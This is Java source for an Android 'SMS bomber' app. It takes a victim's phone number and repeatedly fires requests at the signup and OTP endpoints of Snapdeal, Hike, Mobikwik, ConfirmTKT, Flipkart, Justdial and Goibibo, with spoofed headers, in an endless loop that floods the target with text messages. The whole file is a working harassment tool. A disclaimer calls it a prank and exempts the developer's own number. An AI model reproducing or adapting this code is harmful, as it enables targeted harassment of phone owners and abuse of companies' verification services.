package co.deucate.smsbomber;

import android.annotation.SuppressLint;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Bundle;
import android.provider.ContactsContract;
import android.support.v7.app.AppCompatActivity;
import android.text.Html;
import android.view.Menu;
import android.view.MenuInflater;
import android.view.MenuItem;
import android.view.View;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.EditText;
import android.widget.LinearLayout;
import android.widget.TextView;
import android.widget.Toast;

import com.afollestad.ason.Ason;
import com.afollestad.bridge.Bridge;
import com.afollestad.bridge.BridgeException;
import com.awesomedialog.blennersilva.awesomedialoglibrary.AwesomeNoticeDialog;
import com.awesomedialog.blennersilva.awesomedialoglibrary.interfaces.Closure;
import com.google.android.gms.ads.AdListener;
import com.google.android.gms.ads.AdRequest;
import com.google.android.gms.ads.AdView;
import com.google.android.gms.ads.InterstitialAd;
import com.google.android.gms.ads.MobileAds;

import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;


@SuppressWarnings("ALL")
public class HomeActivity extends AppCompatActivity {

    private static final String TAG = "HomeActivity";
    private static final int REQUEST_CONTACT_NUMBER = 32;
    String mPhoneNumber, mLog;
    EditText mPhoneEt;
    TextView mStatusTV, mLogTV;
    LinearLayout mPhoneLayout;
    AdRequest adRequest;

    private InterstitialAd interstitialAd;

    Thread mThread;

    int a;


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        if (!isNetworkAvailable()) {
            addLog("#FF0000", "Please connect to network");
            return;
        }

        new AwesomeNoticeDialog(this)
                .setTitle("Warning")
                .setMessage("I(Developer of this app) is not responcible for any thing you did with this app. This app is only for prank. If you are not agree with my term and condition please don't use this app. In case you report my app or me i can take action to you.")
                .setColoredCircle(R.color.dialogWarningBackgroundColor)
                .setDialogIconAndColor(R.drawable.ic_dialog_warning, R.color.white)
                .setCancelable(true)
                .setButtonText(getString(R.string.dialog_ok_button))
                .setButtonBackgroundColor(R.color.dialogWarningBackgroundColor)
                .setButtonText(getString(R.string.dialog_ok_button))
                .setNoticeButtonClick(new Closure() {
                    @Override
                    public void exec() {

                    }
                })
                .show();

        AdView adView = findViewById(R.id.mainBottomBannerAd);
        adRequest = new AdRequest.Builder().build();
        adView.loadAd(adRequest);

        MobileAds.initialize(this, "ca-app-pub-8086732239748075~8890173650");

        interstitialAd = new InterstitialAd(this);
        interstitialAd.setAdUnitId("ca-app-pub-8086732239748075/9598708915");
        interstitialAd.loadAd(new AdRequest.Builder().build());


        mPhoneEt = findViewById(R.id.mainPhoneEt);
        mPhoneLayout = findViewById(R.id.linearLayout);
        mStatusTV = findViewById(R.id.mainStatus);
        mLogTV = findViewById(R.id.logTV);

        mLog = mLogTV.getText().toString();

        findViewById(R.id.mainOkBtn).setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                mPhoneNumber = mPhoneEt.getText().toString();

                if (!isNetworkAvailable()) {
                    addLog("#FF0000", "Please connect to network");
                    return;
                }

                if (interstitialAd.isLoaded()) {
                    interstitialAd.show();
                } else {
                    addLog("#FFFF33", "Please wait 10-15 second. Server is busy.");
                    return;
                }

                if (isDeveloperNumber(mPhoneNumber)) {
                    addLog("#FF0000", "Bombing on creator of this app does not make sense.");
                    return;
                }

                new SnapdealBomb().execute();

            }
        });

        findViewById(R.id.contactBtn).setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {

                if (!isNetworkAvailable()) {
                    addLog("#FF0000", "Please connect to network");
                    return;
                }

                Intent intent = new Intent(Intent.ACTION_PICK, ContactsContract.CommonDataKinds.Phone.CONTENT_URI);
                startActivityForResult(intent, REQUEST_CONTACT_NUMBER);
            }
        });

        interstitialAd.setAdListener(new AdListener() {
            @Override
            public void onAdLoaded() {
                addLog("#FFFF33","Server up");
            }

            @Override
            public void onAdFailedToLoad(int errorCode) {
                addLog("#FF0000","Error : "+errorCode);
            }

            @Override
            public void onAdOpened() {
                // Code to be executed when the ad is displayed.

            }

            @Override
            public void onAdLeftApplication() {
                // Code to be executed when the user has left the app.
            }

            @Override
            public void onAdClosed() {
                interstitialAd.loadAd(adRequest);
            }
        });


    }

    private boolean isDeveloperNumber(String phoneNumber) {

        phoneNumber = phoneNumber.replace(" ", "");
        char[] number = phoneNumber.toCharArray();
        char[] myNumber = "9664769226".toCharArray();


        for (int i = 0; i < 10; i++) {
            if (number[i] != myNumber[i]) {
                return false;
            }
        }

        return true;
    }


    @SuppressWarnings("UnusedAssignment")
    @SuppressLint("StaticFieldLeak")
    private class SnapdealBomb extends AsyncTask<Void, Void, Void> {

        @Override
        protected void onPreExecute() {
            super.onPreExecute();
        }

        @Override
        protected Void doInBackground(Void... voids) {

            mThread = new Thread(new Runnable() {
                @Override
                public void run() {

                    Object localObject2 = new Ason();
                    ((Ason) localObject2).put("firstName", "Popol");
                    ((Ason) localObject2).put("middleName", "Lopol");
                    ((Ason) localObject2).put("password", "bomber69");
                    ((Ason) localObject2).put("requestProtocol", "PROTOCOL_JSON");
                    ((Ason) localObject2).put("responseProtocol", "PROTOCOL_JSON");
                    ((Ason) localObject2).put("mobileNumber", mPhoneNumber);
                    try {
                        localObject2 = Bridge.post("https://mobileapi.snapdeal.com/service/user/signUpWithMobileOnly"
                                , new Object[0]).header("v", "6.1.9")
                                .header("api_key", "snapdeal")
                                .header("User-Agent", "android")
                                .body((Ason) localObject2).request().response();

                        final int code = Integer.parseInt(localObject2.toString().substring(0, 3));

                        runOnUiThread(new Runnable() {
                            @Override
                            public void run() {
                                if (code == 200) {
                                    mStatusTV.setText("Snapdeal");
                                    addLog("00AA00", "Bombing with Snapdeal");
                                }
                            }
                        });

                    } catch (BridgeException e) {
                        e.printStackTrace();
                    }

                }
            });

            mThread.start();

            return null;
        }

        @Override
        protected void onPostExecute(Void aVoid) {
            super.onPostExecute(aVoid);
            new HikeBomb().execute();
        }
    }

    @SuppressLint("StaticFieldLeak")
    private class HikeBomb extends AsyncTask<Void, Void, Void> {

        @Override
        protected void onPreExecute() {
            super.onPreExecute();
        }

        @Override
        protected Void doInBackground(Void... voids) {

            mThread = new Thread(new Runnable() {
                @Override
                public void run() {

                    Object localObject = new Ason();
                    ((Ason) localObject).put("method", "pin");
                    ((Ason) localObject).put("msisdn", "+91".concat(mPhoneNumber));
                    try {
                        localObject = Bridge.post("http://api.im.hike.in/v3/account/validate?digits=4").body((Ason) localObject).request().response();

                        final int code = Integer.parseInt(localObject.toString().substring(0, 3));

                        runOnUiThread(new Runnable() {
                            @Override
                            public void run() {
                                mStatusTV.setText("Hike");
                                if (code == 200) {
                                    mStatusTV.setText("Snapdeal");
                                    addLog("00AA00", "Bombing with Hike");
                                }
                            }
                        });
                    } catch (BridgeException e) {
                        e.printStackTrace();
                    }

                }
            });
            mThread.start();

            return null;
        }

        @Override
        protected void onPostExecute(Void aVoid) {
            super.onPostExecute(aVoid);
            new MobikwickBomb().execute();

        }
    }

    private class MobikwickBomb extends AsyncTask<Void, Void, Void> {

        @Override
        protected void onPreExecute() {
            super.onPreExecute();
        }

        @Override
        protected Void doInBackground(Void... voids) {

            mThread = new Thread(new Runnable() {
                @Override
                public void run() {

                    Object localObject1 = new Ason();
                    ((Ason) localObject1).put("cell", mPhoneNumber);
                    try {
                        localObject1 = Bridge.post("https://appapi.mobikwik.com/p/account/otp/cell", new Object[0])
                                .header("User-Agent", "Dalvik/2.1.0 (Linux; U; Android 7.0; SM-G920I Build/NRD90M")
                                .header("X-App-Ver", "1")
                                .header("X-MClient", "3")
                                .body((Ason) localObject1).request().response();

                        final int code = Integer.parseInt(localObject1.toString().substring(0, 3));

                        if (localObject1.toString() == "200") {
                            runOnUiThread(new Runnable() {
                                @Override
                                public void run() {
                                    mStatusTV.setText("Mobikwick");
                                    if (code == 200) {
                                        mStatusTV.setText("Snapdeal");
                                        addLog("00AA00", "Bombing with Mobikwick");
                                    }
                                }
                            });
                        }

                    } catch (BridgeException e) {
                        e.printStackTrace();
                    }

                }
            });
            mThread.start();
            return null;
        }

        @Override
        protected void onPostExecute(Void aVoid) {
            super.onPostExecute(aVoid);
            new ConfirmTktBomb().execute();

        }
    }

    @SuppressLint("StaticFieldLeak")
    private class ConfirmTktBomb extends AsyncTask<Void, Void, Void> {

        @Override
        protected void onPreExecute() {
            super.onPreExecute();
        }

        @Override
        protected Void doInBackground(Void... voids) {

            mThread = new Thread(new Runnable() {
                @Override
                public void run() {

                    runOnUiThread(new Runnable() {
                        @Override
                        public void run() {
                            WebView webView = new WebView(HomeActivity.this);
                            webView.loadUrl("https://securedapi.confirmtkt.com/api/platform/register?mobileNumber=" + mPhoneNumber);
                            webView.setWebViewClient(new WebViewClient());
                            mStatusTV.setText("ConfirmTKT");
                            addLog("00AA00", "Bombing with ConfirmTKT");

                        }
                    });

                }
            });
            mThread.start();

            return null;
        }

        @Override
        protected void onPostExecute(Void aVoid) {
            super.onPostExecute(aVoid);
            new FlipkartBomb().execute();

        }
    }

    @SuppressLint("StaticFieldLeak")
    private class FlipkartBomb extends AsyncTask<Void, Void, Void> {

        @Override
        protected void onPreExecute() {
            super.onPreExecute();
        }

        @Override
        protected Void doInBackground(Void... voids) {

            mThread = new Thread(new Runnable() {
                @Override
                public void run() {

                    MediaType localMediaType = MediaType.parse("application/json; charset=utf-8");
                    OkHttpClient localOkHttpClient = new OkHttpClient();
                    RequestBody localRequestBody = RequestBody.create(localMediaType, "{\"loginId\":[\"+91" + mPhoneNumber + "\"],\"supportAllStates\":true}");
                    localOkHttpClient.newCall(new Request.Builder().url("https://www.flipkart.com/api/6/user/signup/status")
                            .post(localRequestBody).addHeader("host", "www.flipkart.com")
                            .addHeader("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0")
                            .addHeader("accept", "*/*")
                            .addHeader("accept-language", "en-US,en;q=0.5")
                            .addHeader("accept-encoding", "gzip, deflate, br")
                            .addHeader("referer", "https://www.flipkart.com/")
                            .addHeader("x-user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0 FKUA/website/41/website/Desktop")
                            .addHeader("content-type", "application/json")
                            .addHeader("origin", "https://www.flipkart.com")
                            .addHeader("content-length", "53").addHeader("connection", "keep-alive").build());

                    runOnUiThread(new Runnable() {
                        @Override
                        public void run() {
                            addLog("00AA00", "Bombing with Flipkart");
                        }
                    });

                }
            });
            mThread.start();

            return null;
        }

        @Override
        protected void onPostExecute(Void aVoid) {
            super.onPostExecute(aVoid);
            new JustDileBomb().execute();

        }
    }

    @SuppressLint("StaticFieldLeak")
    private class JustDileBomb extends AsyncTask<Void, Void, Void> {

        @Override
        protected void onPreExecute() {
            super.onPreExecute();
        }

        @Override
        protected Void doInBackground(Void... voids) {

            mThread = new Thread(new Runnable() {
                @Override
                public void run() {

                    String str = "https://www.justdial.com/functions/ajxandroid.php?phn=" + mPhoneNumber + "&em=e.g.+abc%40xyz.com&vcode=-&type=1&applink=aib&apppage=jdmpage&pageName=jd_on_mobile";
                    new OkHttpClient().newCall(new Request.Builder().url(str)
                            .addHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36")
                            .build());

                    runOnUiThread(new Runnable() {
                        @Override
                        public void run() {
                            addLog("00AA00", "Bombing with Justdiel");

                        }
                    });

                }
            });
            mThread.start();
            return null;
        }

        @Override
        protected void onPostExecute(Void aVoid) {
            super.onPostExecute(aVoid);
            new GoibiboBomb().execute();

        }
    }

    @SuppressLint("StaticFieldLeak")
    private class GoibiboBomb extends AsyncTask<Void, Void, Void> {

        @Override
        protected void onPreExecute() {
            super.onPreExecute();
        }

        @Override
        protected Void doInBackground(Void... voids) {

            mThread = new Thread(new Runnable() {
                @Override
                public void run() {

                    OkHttpClient localOkHttpClient = new OkHttpClient();
                    RequestBody localRequestBody = RequestBody.create(MediaType.parse("application/x-www-form-urlencoded"), "mbl=" + mPhoneNumber);
                    localOkHttpClient.newCall(new Request.Builder().url("https://www.goibibo.com/common/downloadsms/")
                            .post(localRequestBody).addHeader("host", "www.goibibo.com")
                            .addHeader("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0")
                            .addHeader("accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
                            .addHeader("accept-language", "en-US,en;q=0.5")
                            .addHeader("accept-encoding", "gzip, deflate, br")
                            .addHeader("referer", "https://www.goibibo.com/mobile/?sms=success")
                            .addHeader("content-type", "application/x-www-form-urlencoded")
                            .addHeader("content-length", "14")
                            .addHeader("connection", "keep-alive")
                            .addHeader("upgrade-insecure-requests", "1").build());

                    runOnUiThread(new Runnable() {
                        @Override
                        public void run() {
                            addLog("00AA00", "Bombing with Goibibo");

                        }
                    });
                }
            });
            mThread.start();
            return null;
        }

        @Override
        protected void onPostExecute(Void aVoid) {
            super.onPostExecute(aVoid);
            new SnapdealBomb().execute();

        }
    }



    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        MenuInflater inflater = getMenuInflater();
        inflater.inflate(R.menu.overflow, menu);
        return super.onCreateOptionsMenu(menu);
    }

    @Override
    public boolean onOptionsItemSelected(MenuItem item) {

        switch (item.getItemId()) {
            case R.id.menuAbout: {
                addLog("#0000FF", "Created by Spidy0471");
                return true;
            }

            case R.id.menuWeb: {
                Toast.makeText(this, "Website is under contruction", Toast.LENGTH_SHORT).show();
                return true;
            }

            default: {
                return super.onOptionsItemSelected(item);
            }
        }

    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {

        if (resultCode == RESULT_OK && requestCode == REQUEST_CONTACT_NUMBER) {

            Uri uri = data.getData();
            @SuppressLint("Recycle")
            Cursor cursor = getContentResolver().query(uri, null, null, null, null);
            assert cursor != null;
            cursor.moveToFirst();
            int colum = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER);
            String numberT = cursor.getString(colum);
            String number = "";
            if (numberT.contains("+")) {
                numberT = numberT.substring(3);
                number = numberT.replaceAll(" ", "");
                mPhoneNumber = number;
                mPhoneEt.setText(number);
                Toast.makeText(this, mPhoneNumber, Toast.LENGTH_SHORT).show();
            }

            if (isDeveloperNumber(mPhoneNumber)) {
                addLog("#FF0000", "Bombing on creator of this app dosen't make sence. :(");
                return;
            }
            mPhoneNumber = numberT;
            mPhoneEt.setText(numberT);
            new SnapdealBomb().execute();

        }

    }

    private boolean isNetworkAvailable() {
        ConnectivityManager connectivityManager
                = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo activeNetworkInfo = connectivityManager.getActiveNetworkInfo();
        return activeNetworkInfo != null && activeNetworkInfo.isConnected();
    }

    private void addLog(String color, String log) {
        String newLog = "<font color='" + color + "'>" + log + "</font>";
        mLog += "<br/>> " + newLog;
        mLogTV.setText(Html.fromHtml(mLog));
    }

}
